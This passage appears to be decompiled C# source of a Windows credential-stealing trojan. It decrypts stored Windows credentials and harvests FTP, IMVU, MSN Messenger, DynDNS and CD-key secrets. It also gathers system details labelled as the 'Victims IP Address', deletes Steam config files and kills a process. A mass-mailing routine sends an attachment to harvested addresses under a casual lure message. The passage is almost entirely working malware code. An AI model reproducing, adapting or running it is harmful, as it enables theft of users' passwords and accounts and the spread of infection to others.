					IntPtr intptr_ = new IntPtr(int_5 + i * 4);
					IntPtr intPtr = Marshal.ReadIntPtr(intptr_);
					object? obj2 = Marshal.PtrToStructure(intPtr, struct3.GetType());
					struct3 = ((obj2 != null) ? ((Class9.Struct9)obj2) : struct4);
					IntPtr intptr_2 = intptr_;
					intptr_ = new IntPtr(struct3.int_2);
					string text3 = Class34.smethod_142(intptr_2, (Class8)class9_0);
					struct6_.int_0 = 74;
					intPtr = Marshal.AllocHGlobal(74);
					string text4 = "abe2869f-9b47-4cd9-a358-c22904dba7f7\0";
					int num3 = 0;
					do
					{
						Marshal.WriteInt16(intPtr, num3 * 2, (short)(Strings.Asc(Strings.Mid(text4, num3 + 1, 1)) * 4));
						num3++;
					}
					while (num3 <= 36);
					struct6_.int_1 = intPtr.ToInt32();
					struct6_2.int_1 = struct3.int_5;
					struct6_2.int_0 = struct3.int_4;
					struct6_3.int_0 = 0;
					struct6_3.int_1 = 0;
					Class34.CryptUnprotectData_3(ref struct6_2, 0, ref struct6_, 0, 0, 0, ref struct6_3);
					Marshal.FreeHGlobal(intPtr);
					intptr_ = new IntPtr(struct6_3.int_1);
					string text5 = Marshal.PtrToStringUni(intptr_);
					string[] array = Strings.Split(text5, ":", -1, (CompareMethod)0);
					int num4 = Strings.InStr(Strings.Mid(text3, 19), "/", (CompareMethod)0);
					if (num4 > 0)
					{
						class9_0.list_0.Add(new Class7(text3, Strings.Mid(text3, 19, num4 - 1), array[0], array[1], DateTime.MinValue, 2, Strings.Mid(text3, 19 + num4)));
					}
					else
					{
						class9_0.list_0.Add(new Class7(text3, Strings.Mid(text3, 19), array[0], array[1], DateTime.MinValue, 2, string.Empty));
					}
					Class34.LocalFree(struct6_3.int_1);
				}
			}
			Class34.CredFree_1(int_5);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\FTP\\Accounts");
			string[] subKeyNames = registryKey.GetSubKeyNames();
			foreach (string text6 in subKeyNames)
			{
				RegistryKey registryKey2 = registryKey.OpenSubKey(text6);
				string[] subKeyNames2 = registryKey2.GetSubKeyNames();
				foreach (string text7 in subKeyNames2)
				{
					RegistryKey registryKey3 = registryKey2.OpenSubKey(text7);
					byte[] array2 = (byte[])registryKey3.GetValue("Password");
					byte[] array3 = new byte[4];
					int num5 = text6.Length - 1;
					for (int l = 0; l <= num5; l++)
					{
						byte b = (byte)(text6[l] & 0x1F);
						array3[l & 3] = (byte)unchecked((uint)(array3[l & 3] + b));
					}
					struct6_2.int_0 = array2.Length;
					struct6_2.int_1 = Marshal.AllocHGlobal(array2.Length).ToInt32();
					IntPtr intptr_ = new IntPtr(struct6_2.int_1);
					Marshal.Copy(array2, 0, intptr_, array2.Length);
					struct6_3.int_0 = 0;
					struct6_3.int_1 = 0;
					GCHandle gCHandle = GCHandle.Alloc(array3, GCHandleType.Pinned);
					struct6_.int_1 = gCHandle.AddrOfPinnedObject().ToInt32();
					struct6_.int_0 = 4;
					Class34.CryptUnprotectData_3(ref struct6_2, 0, ref struct6_, 0, 0, 0, ref struct6_3);
					gCHandle.Free();
					List<Class7> list_ = class9_0.list_0;
					string string_3 = $"ftp://{text6}@{text7}/";
					intptr_ = new IntPtr(struct6_3.int_1);
					list_.Add(new Class7(text6, string_3, text7, Marshal.PtrToStringUni(intptr_), DateTime.MinValue, 3, string.Empty));
					Class34.LocalFree(struct6_3.int_1);
				}
			}
		}
	}

	static int smethod_35(Class41.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, EntryPoint = "CryptUnprotectData", SetLastError = true)]
	static extern bool CryptUnprotectData_2(ref Form1.Struct2 struct2_0, string string_0, ref Form1.Struct2 struct2_1, IntPtr intptr_0, ref Form1.Struct1 struct1_0, int int_0, ref Form1.Struct2 struct2_2);

	static void smethod_36(Form1 form1_0)
	{
		string string_ = "HKEY_CURRENT_USER\\Software\\IMVU\\username\\";
		string string_2 = "HKEY_CURRENT_USER\\Software\\IMVU\\password\\";
		form1_0.string_49 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"IMVU : \r\nUsername : ", Class34.smethod_157(ref string_, form1_0)), (object)"\r\n"), (object)"Password : "), (object)Class34.smethod_152(form1_0, Conversions.ToString(Class34.smethod_157(ref string_2, form1_0)))));
	}

	static void smethod_37()
	{
		string string_ = Class25.string_1;
		string string_2 = "*.*";
		Class25.arrayList_0 = Class34.smethod_73(string_2, string_);
		ArrayList arrayList_ = Class25.arrayList_0;
		arrayList_.Reverse();
		string text = Class34.smethod_77();
		if (Operators.CompareString(text, "", false) == 0 || Class25.arrayList_0.Count <= 0)
		{
			return;
		}
		Attachment attachment = new Attachment(text);
		IEnumerator enumerator = Class25.arrayList_0.GetEnumerator();
		string text2 = "";
		string text3 = "";
		ArrayList arrayList = new ArrayList();
		while (enumerator.MoveNext())
		{
			text2 = Convert.ToString(RuntimeHelpers.GetObjectValue(enumerator.Current));
			IEnumerator enumerator2 = arrayList_.GetEnumerator();
			while (enumerator2.MoveNext())
			{
				text3 = Convert.ToString(RuntimeHelpers.GetObjectValue(enumerator2.Current));
				if (Operators.CompareString(text2, text3, false) != 0 && !arrayList.Contains(text2))
				{
					arrayList.Add(text2);
					MailAddress to = new MailAddress(text2);
					MailAddress from = new MailAddress(text3);
					MailMessage mailMessage = new MailMessage(from, to);
					mailMessage.Subject = "Hey";
					mailMessage.Body = "Hey hows it going? I attached that file you were asking about. Let me know if it worKs for you or not. I'm not sure what I'm going to do the tommorow maybe get some coffee and do some shopping. Well give me a call later okay?";
					mailMessage.Attachments.Add(attachment);
					string string_3 = text2.Substring(text2.IndexOf("@")).Replace("@", string.Empty);
					string host = Class34.smethod_42(string_3);
					try
					{
						SmtpClient smtpClient = new SmtpClient(host);
						smtpClient.Send(mailMessage);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		attachment.Dispose();
	}

	static void smethod_38()
	{
		try
		{
			Class37.smethod_0();
		}
		catch (Exception)
		{
		}
	}

	static void smethod_39(string string_0)
	{
		string[] files = Directory.GetFiles(string_0);
		string[] array = files;
		foreach (string text in array)
		{
			if (text.Contains(".rar"))
			{
				Class34.smethod_0(text);
			}
			if (text.Contains(".zip"))
			{
				Class34.smethod_0(text);
			}
		}
		string[] directories = Directory.GetDirectories(string_0);
		string[] array2 = directories;
		foreach (string string_ in array2)
		{
			Class34.smethod_39(string_);
		}
	}

	static void smethod_40(Form1 form1_0)
	{
		try
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Steam\\config\\SteamAppData.vdf";
			if (File.Exists(path))
			{
				File.Delete(path);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string path2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Steam\\config\\SteamAppData.vdf";
			if (File.Exists(path2))
			{
				File.Delete(path2);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_41(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					form1_0.registryKey_0 = Registry.LocalMachine;
					goto IL_000d;
				case 851:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000d;
						case 3:
							goto IL_0025;
						case 4:
							goto IL_003d;
						case 5:
							goto IL_0055;
						case 6:
							goto IL_006d;
						case 7:
							goto IL_0085;
						case 8:
							goto IL_008c;
						case 9:
							goto IL_0094;
						case 10:
							goto IL_009b;
						case 11:
							goto IL_00a4;
						case 12:
							goto IL_00ab;
						case 13:
							goto IL_00b4;
						case 14:
							goto IL_00bb;
						case 15:
							goto IL_00c4;
						case 16:
							goto IL_00e1;
						case 17:
							goto IL_0113;
						case 18:
							goto IL_013b;
						case 19:
							goto IL_015f;
						case 20:
							goto IL_0191;
						case 21:
							goto IL_01b5;
						case 22:
							goto IL_01d9;
						case 23:
							goto IL_0216;
						case 24:
							goto IL_0253;
						case 25:
							goto IL_0277;
						case 26:
							goto IL_027e;
						case 27:
							goto IL_0292;
						case 28:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 29:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0292:
					num = 27;
					form1_0.vmethod_128().set_Text(form1_0.vmethod_126().get_Text() + form1_0.string_61 + form1_0.vmethod_124().get_Text());
					break;
					IL_000d:
					num = 2;
					form1_0.registryKey_1 = form1_0.registryKey_0.OpenSubKey("HARDWARE");
					goto IL_0025;
					IL_0025:
					num = 3;
					form1_0.registryKey_2 = form1_0.registryKey_1.OpenSubKey("DESCRIPTION");
					goto IL_003d;
					IL_003d:
					num = 4;
					form1_0.registryKey_3 = form1_0.registryKey_2.OpenSubKey("SYSTEM");
					goto IL_0055;
					IL_0055:
					num = 5;
					form1_0.registryKey_4 = form1_0.registryKey_3.OpenSubKey("CentralProcessor");
					goto IL_006d;
					IL_006d:
					num = 6;
					form1_0.registryKey_5 = form1_0.registryKey_4.OpenSubKey("0");
					goto IL_0085;
					IL_0085:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_008c;
					IL_008c:
					num = 8;
					Class34.smethod_98(form1_0);
					goto IL_0094;
					IL_0094:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_009b;
					IL_009b:
					num = 10;
					Class34.smethod_111(form1_0);
					goto IL_00a4;
					IL_00a4:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_00ab;
					IL_00ab:
					num = 12;
					Class34.smethod_13(form1_0);
					goto IL_00b4;
					IL_00b4:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_00bb;
					IL_00bb:
					num = 14;
					Class34.smethod_163(form1_0);
					goto IL_00c4;
					IL_00c4:
					num = 15;
					form1_0.string_68 = "Computer Name                : " + ((ServerComputer)Class1.smethod_0()).get_Name();
					goto IL_00e1;
					IL_00e1:
					num = 16;
					form1_0.string_68 = form1_0.string_68 + Environment.NewLine + "Computer Os                  : " + ((ServerComputer)Class1.smethod_0()).get_Info().get_OSFullName().ToString();
					goto IL_0113;
					IL_0113:
					num = 17;
					form1_0.string_68 = form1_0.string_68 + Environment.NewLine + ".Net Run Time                : " + Environment.Version.ToString();
					goto IL_013b;
					IL_013b:
					num = 18;
					form1_0.string_68 = form1_0.string_68 + Environment.NewLine + "Os Manufacturer              : " + form1_0.string_64;
					goto IL_015f;
					IL_015f:
					num = 19;
					form1_0.string_68 = form1_0.string_68 + Environment.NewLine + "Total Physical Memory        : " + Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Info().get_TotalPhysicalMemory());
					goto IL_0191;
					IL_0191:
					num = 20;
					form1_0.string_68 = form1_0.string_68 + Environment.NewLine + "Mother Board ManFactor       : " + form1_0.string_65;
					goto IL_01b5;
					IL_01b5:
					num = 21;
					form1_0.string_68 = form1_0.string_68 + Environment.NewLine + "Mother Board Serial Key      : " + form1_0.string_67;
					goto IL_01d9;
					IL_01d9:
					num = 22;
					form1_0.string_68 = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(form1_0.string_68 + Environment.NewLine, "Computer Processor           : "), form1_0.registryKey_5.GetValue("VendorIdentifier")));
					goto IL_0216;
					IL_0216:
					num = 23;
					form1_0.string_68 = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(form1_0.string_68 + Environment.NewLine, "                              "), form1_0.registryKey_5.GetValue("ProcessorNameString")));
					goto IL_0253;
					IL_0253:
					num = 24;
					form1_0.string_68 = form1_0.string_68 + Environment.NewLine + "Victims IP Address           : " + form1_0.string_69;
					goto IL_0277;
					IL_0277:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_027e;
					IL_027e:
					num = 26;
					form1_0.vmethod_126().set_Text(form1_0.string_68);
					goto IL_0292;
					end_IL_0000_2:
					break;
				}
				num = 28;
				Class34.smethod_154(form1_0);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 851;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int CloseIdentityHandle(int int_0);

	static string smethod_42(string string_0)
	{
		IntPtr intptr_ = IntPtr.Zero;
		IntPtr zero = IntPtr.Zero;
		int num = Class34.DnsQuery_W(ref string_0, 15, 8, 0, ref intptr_, 0);
		string result = "";
		if (num != 0)
		{
			result = string_0;
		}
		else
		{
			zero = intptr_;
			while (!zero.Equals((object?)(nint)IntPtr.Zero))
			{
				Class25.Struct22 @struct = (Class25.Struct22)Marshal.PtrToStructure(zero, typeof(Class25.Struct22));
				if (@struct.short_0 == 15)
				{
					string text = Marshal.PtrToStringAuto(@struct.intptr_1);
					if (Operators.CompareString(text, "", false) != 0)
					{
						result = text;
					}
				}
				zero = @struct.intptr_0;
			}
		}
		return result;
	}

	static void smethod_43(Form1 form1_0)
	{
		Class34.smethod_134(form1_0);
		StreamWriter streamWriter = new StreamWriter(form1_0.string_45 + "\\cdkeys.txt", append: true);
		streamWriter.Write(Class34.smethod_4());
		streamWriter.Close();
	}

	static void smethod_44(byte[] byte_0, int int_0, int int_1, Class41.Class43 class43_0)
	{
		if (class43_0.int_0 < class43_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_0 + int_1;
		if (0 <= int_0 && int_0 <= num && num <= byte_0.Length)
		{
			if (((uint)int_1 & (true ? 1u : 0u)) != 0)
			{
				class43_0.uint_0 |= (uint)((byte_0[int_0++] & 0xFF) << class43_0.int_2);
				class43_0.int_2 += 8;
			}
			class43_0.byte_0 = byte_0;
			class43_0.int_0 = int_0;
			class43_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static void smethod_45()
	{
		try
		{
			if (Environment.OSVersion.Platform == PlatformID.Win32NT)
			{
				MemoryManager.memoryManager_0 = new MemoryManager();
			}
		}
		catch
		{
		}
	}

	static void smethod_46(Class10 class10_0)
	{
		string string_ = Class34.smethod_148(class10_0) + "\\MSN Messenger\\msidcrl.dll";
		if (Operators.CompareString(FileSystem.Dir(string_, (FileAttribute)0), (string)null, false) == 0)
		{
			return;
		}
		int int_ = Class34.LoadLibraryA(ref string_);
		Guid guid_ = new Guid(1896408858, -26330, 20427, new byte[8] { 188, 201, 154, 157, 63, 50, 228, 35 });
		Class34.Initialize(ref guid_, 1, 15);
		int int_2 = default(int);
		IntPtr intptr_ = default(IntPtr);
		int int_3 = default(int);
		int int_4 = default(int);
		if (Class34.EnumIdentitiesWithCachedCredentials("ps:password", ref int_2) == 0)
		{
			IntPtr intptr_2 = default(IntPtr);
			for (int num = Class34.NextIdentity(int_2, ref intptr_); num == 0; num = Class34.NextIdentity(int_2, ref intptr_))
			{
				num = Class34.CreateIdentityHandle(intptr_, 255, ref int_3);
				if ((num == 0) & (intptr_ != IntPtr.Zero))
				{
					num = Class34.HasPersistedCredential(int_3, "ps:password", ref int_4);
					if (num == 0 && int_4 != 0)
					{
						checked
						{
							if (Class34.BuildAuthTokenRequest(int_3, "ps:password", 0, ref intptr_2) == 0)
							{
								string text = Class34.smethod_142(intptr_2, (Class8)class10_0);
								int num2 = Strings.InStr(text, "<wsse:Password>", (CompareMethod)0) + 15;
								int num3 = Strings.InStr(text, "</wsse:Password>", (CompareMethod)0);
								if (num3 > 0)
								{
									List<Class17> list_ = class10_0.list_0;
									string string_2 = Class34.smethod_142(intptr_, (Class8)class10_0);
									string string_3 = Strings.Mid(text, num2, num3 - num2);
									string string_4 = "ps:" + Class34.smethod_142(intptr_, (Class8)class10_0);
									list_.Add(new Class17(ref string_2, ref string_3, ref string_4));
								}
							}
							if (intptr_2 != IntPtr.Zero)
							{
								Class34.PassportFreeMemory(intptr_2);
							}
						}
					}
					num = Class34.CloseIdentityHandle(int_3);
				}
				if (intptr_ != IntPtr.Zero)
				{
					Class34.PassportFreeMemory(intptr_);
				}
			}
		}
		Class34.CloseEnumIdentitiesHandle(int_2);
		if (Class34.EnumIdentitiesWithCachedCredentials("ps:membernameonly", ref int_2) == 0)
		{
			for (int num = Class34.NextIdentity(int_2, ref intptr_); num == 0; num = Class34.NextIdentity(int_2, ref intptr_))
			{
				num = Class34.CreateIdentityHandle(intptr_, 255, ref int_3);
				if ((num == 0) & (intptr_ != IntPtr.Zero))
				{
					num = Class34.HasPersistedCredential(int_3, "ps:password", ref int_4);
					if (num == 0 && int_4 == 0)
					{
						List<Class17> list_2 = class10_0.list_0;
						string string_4 = Class34.smethod_142(intptr_, (Class8)class10_0);
						string string_3 = string.Empty;
						string string_2 = "ps:" + Class34.smethod_142(intptr_, (Class8)class10_0);
						list_2.Add(new Class17(ref string_4, ref string_3, ref string_2));
					}
					num = Class34.CloseIdentityHandle(int_3);
				}
				if (intptr_ != IntPtr.Zero)
				{
					Class34.PassportFreeMemory(intptr_);
				}
			}
		}
		Class34.CloseEnumIdentitiesHandle(int_2);
		Class34.Uninitialize();
		Class34.FreeLibrary(int_);
	}

	[DllImport("sqlite3")]
	static extern double sqlite3_column_double(IntPtr intptr_0, int int_0);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int CredEnumerateW([MarshalAs(UnmanagedType.LPWStr)] string string_0, int int_0, ref int int_1, ref int int_2);

	static string smethod_47(Form1 form1_0, string string_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		char[] array = default(char[]);
		UTF8Encoding uTF8Encoding = default(UTF8Encoding);
		Decoder decoder = default(Decoder);
		byte[] array2 = default(byte[]);
		int charCount = default(int);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 171:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_001c;
						case 5:
							goto IL_0027;
						case 6:
							goto IL_0039;
						case 7:
							goto IL_0047;
						case 8:
							goto IL_005b;
						case 9:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 10:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_005b:
					num = 8;
					text = new string(array);
					break;
					IL_0008:
					num = 2;
					uTF8Encoding = new UTF8Encoding();
					goto IL_0011;
					IL_0011:
					num = 3;
					decoder = uTF8Encoding.GetDecoder();
					goto IL_001c;
					IL_001c:
					num = 4;
					array2 = Convert.FromBase64String(string_0);
					goto IL_0027;
					IL_0027:
					num = 5;
					charCount = decoder.GetCharCount(array2, 0, array2.Length);
					goto IL_0039;
					IL_0039:
					num = 6;
					array = new char[checked(charCount - 1 + 1)];
					goto IL_0047;
					IL_0047:
					num = 7;
					decoder.GetChars(array2, 0, array2.Length, array, 0);
					goto IL_005b;
					end_IL_0000_2:
					break;
				}
				num = 9;
				text2 = text;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 171;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text2;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	static void smethod_48(Form1.Class5.Delegate1 delegate1_0)
	{
		Form1.Class5.delegate1_0 = (Form1.Class5.Delegate1)Delegate.Combine(Form1.Class5.delegate1_0, delegate1_0);
	}

	static string smethod_49(Class15 class15_0)
	{
		return class15_0.string_0;
	}

	static void smethod_50(string string_0)
	{
		Class27.string_1 = string_0;
		string[] logicalDrives = Environment.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string string_ in array)
		{
			Class34.smethod_39(string_);
		}
		File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\temp48.txt");
	}

	static void smethod_51(Class41.Class44 class44_0, int int_0)
	{
		if (class44_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class44_0.byte_0[class44_0.int_0++] = (byte)int_0;
		class44_0.int_0 &= 32767;
	}

	static void smethod_52(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Process[] processes = default(Process[]);
		int num6 = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 163:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0020;
						case 6:
						case 7:
							goto IL_0031;
						case 8:
							goto IL_0043;
						case 5:
						case 9:
						case 10:
						case 11:
						case 12:
							goto IL_004e;
						default:
							goto end_IL_0000;
						case 13:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_004e:
					num = 12;
					num5 = checked(num5 + 1);
					goto IL_001c;
					IL_0008:
					num = 2;
					processes = Process.GetProcesses();
					goto IL_0011;
					IL_0011:
					num = 3;
					num6 = checked(processes.Length - 1);
					num5 = 0;
					goto IL_001c;
					IL_001c:
					if (num5 > num6)
					{
						goto end_IL_0000_2;
					}
					goto IL_0020;
					IL_0020:
					num = 4;
					text = Strings.LCase(processes[num5].ProcessName);
					goto IL_0031;
					IL_0031:
					num = 7;
					if (Operators.CompareString(text, "npfmsg", false) == 0)
					{
						goto IL_0043;
					}
					goto IL_004e;
					IL_0043:
					num = 8;
					processes[num5].Kill();
					goto IL_004e;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 163;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static int smethod_53(IntPtr intptr_0, Class29 class29_0)
	{
		if (intptr_0 == IntPtr.Zero)
		{
			return 0;
		}
		return Class34.lstrlen(intptr_0);
	}

	static MySettings smethod_54()
	{
		return MySettings.Default;
	}

	static void smethod_55(Class11 class11_0)
	{
		Class14 class14_ = class11_0.class14_0;
		Guid guid_ = class11_0.guid_0;
		Guid guid_2 = class11_0.guid_1;
		Class12 @class = Class34.smethod_16(Class34.smethod_20(guid_, class14_, guid_2), 0);
		class11_0.list_0.Clear();
		if (@class == null)
		{
			return;
		}
		byte[] value = Class34.smethod_79(@class);
		GCHandle gCHandle = GCHandle.Alloc(value, GCHandleType.Pinned);
		Class11.Struct17 @struct = default(Class11.Struct17);
		object? obj = Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), @struct.GetType());
		Class11.Struct17 struct2 = default(Class11.Struct17);
		@struct = ((obj != null) ? ((Class11.Struct17)obj) : struct2);
		checked
		{
			if (@struct.int_1 != 0)
			{
				IntPtr ptr = new IntPtr(gCHandle.AddrOfPinnedObject().ToInt32() + Strings.Len((object)@struct));
				short num = (short)(@struct.int_1 - 1);
				for (short num2 = 0; num2 <= num; num2 = (short)unchecked(num2 + 1))
				{
					int num3 = Marshal.ReadInt32(ptr);
					ptr = new IntPtr(ptr.ToInt32() + 4);
					string string_ = Class34.smethod_142(ptr, (Class8)class11_0);
					ptr = new IntPtr(ptr.ToInt32() + num3);
					num3 = Marshal.ReadInt32(ptr);
					ptr = new IntPtr(ptr.ToInt32() + 4);
					string string_2 = Class34.smethod_142(ptr, (Class8)class11_0);
					class11_0.list_0.Add(new Class18(string_, string_2));
					ptr = new IntPtr(ptr.ToInt32() + num3 + 24);
				}
				gCHandle.Free();
			}
		}
	}

	static void smethod_56(Class41.Class43 class43_0, int int_0)
	{
		class43_0.uint_0 >>= int_0;
		class43_0.int_2 -= int_0;
	}

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "CredFree", ExactSpelling = true, SetLastError = true)]
	static extern int CredFree_1(int int_0);

	static int smethod_57(Class41.Class43 class43_0)
	{
		return class43_0.int_1 - class43_0.int_0 + (class43_0.int_2 >> 3);
	}

	static int smethod_58(Class41.Class43 class43_0, int int_0)
	{
		if (class43_0.int_2 < int_0)
		{
			if (class43_0.int_0 == class43_0.int_1)
			{
				return -1;
			}
			class43_0.uint_0 |= (uint)(((class43_0.byte_0[class43_0.int_0++] & 0xFF) | ((class43_0.byte_0[class43_0.int_0++] & 0xFF) << 8)) << class43_0.int_2);
			class43_0.int_2 += 16;
		}
		return (int)(class43_0.uint_0 & ((1 << int_0) - 1));
	}

	static int smethod_59(Class41.Stream0 stream0_0)
	{
		return Class34.smethod_35(stream0_0) | (Class34.smethod_35(stream0_0) << 16);
	}

	static void smethod_60(Form1 form1_0)
	{
		using IEnumerator<Class15> enumerator = form1_0.class16_0.System_002ECollections_002EGeneric_002EIEnumerable_003Cns1_002EClass15_003E_002EGetEnumerator();
		while (enumerator.MoveNext())
		{
			Class15 current = enumerator.Current;
			form1_0.string_53 = "---------------------------------------------\r\nWebSite: " + Class34.smethod_49(current) + "\r\nUsername: " + Class34.smethod_11(current) + "\r\nPassword: " + Class34.smethod_24(current) + "\r\n--------------------------------------------- ";
		}
	}

	static int smethod_61(Class41.Class44 class44_0, Class41.Class43 class43_0, int int_0)
	{
		int_0 = Math.Min(Math.Min(int_0, 32768 - class44_0.int_1), Class34.smethod_57(class43_0));
		int num = 32768 - class44_0.int_0;
		int num2;
		if (int_0 > num)
		{
			num2 = Class34.smethod_120(class43_0, class44_0.byte_0, class44_0.int_0, num);
			if (num2 == num)
			{
				num2 += Class34.smethod_120(class43_0, class44_0.byte_0, 0, int_0 - num);
			}
		}
		else
		{
			num2 = Class34.smethod_120(class43_0, class44_0.byte_0, class44_0.int_0, int_0);
		}
		class44_0.int_0 = (class44_0.int_0 + num2) & 0x7FFF;
		class44_0.int_1 += num2;
		return num2;
	}

	static void smethod_62()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class34.smethod_137;
		}
		catch
		{
		}
	}

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int HasPersistedCredential(int int_0, [MarshalAs(UnmanagedType.LPWStr)] string string_0, ref int int_1);

	static void smethod_63(Form1 form1_0)
	{
		string string_ = Strings.Replace(Interaction.Environ("APPDATA"), Interaction.Environ("Username"), "All Users", 1, -1, (CompareMethod)0) + "\\DynDNS\\Updater\\config.dyndns";
		string string_2 = Class34.smethod_151(form1_0, string_);
		string string_3 = "[Hosts]";
		string string_4 = "Count=";
		string text = Class34.smethod_5(string_3, string_4, form1_0, string_2);
		string_3 = "Username=";
		string_4 = "\r\n";
		string text2 = Class34.smethod_5(string_3, string_4, form1_0, string_2);
		string_3 = "Password=";
		string_4 = "\r\n";
		string text3 = Class34.smethod_5(string_3, string_4, form1_0, string_2);
		if (Operators.CompareString(text3, "", false) != 0)
		{
			form1_0.string_47 = "Hosts:" + text + "\r\nUser: " + text2 + "\r\nPwd: " + text3 + "\r\n";
		}
		else
		{
			form1_0.string_47 = "Dyn-Dns - No Records Found";
		}
	}

	static void smethod_64(Class41.Class43 class43_0)
	{
		class43_0.uint_0 >>= class43_0.int_2 & 7;
		class43_0.int_2 &= -8;
	}

	static void smethod_65(ref Guid guid_0, ref Guid guid_1, string string_0, Class12 class12_0, GInterface3 ginterface3_0, Enum1 enum1_0)
	{
		class12_0.ginterface3_0 = ginterface3_0;
		class12_0.guid_0 = guid_0;
		class12_0.guid_1 = guid_1;
		class12_0.string_0 = string_0;
		class12_0.enum1_0 = enum1_0;
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	static DataTable smethod_66(string string_0, Class29 class29_0)
	{
		IntPtr intptr_ = default(IntPtr);
		IntPtr intptr_2 = default(IntPtr);
		Class34.sqlite3_prepare_v2(class29_0.intptr_0, Class34.smethod_160(class29_0, string_0), Class34.smethod_53(Class34.smethod_160(class29_0, string_0), class29_0), ref intptr_, ref intptr_2);
		DataTable dataTable_ = new DataTable();
		for (int num = Class34.smethod_147(ref dataTable_, intptr_, class29_0); num == 100; num = Class34.smethod_99(class29_0, intptr_, ref dataTable_))
		{
		}
		Class34.sqlite3_finalize(intptr_);
		return dataTable_;
	}

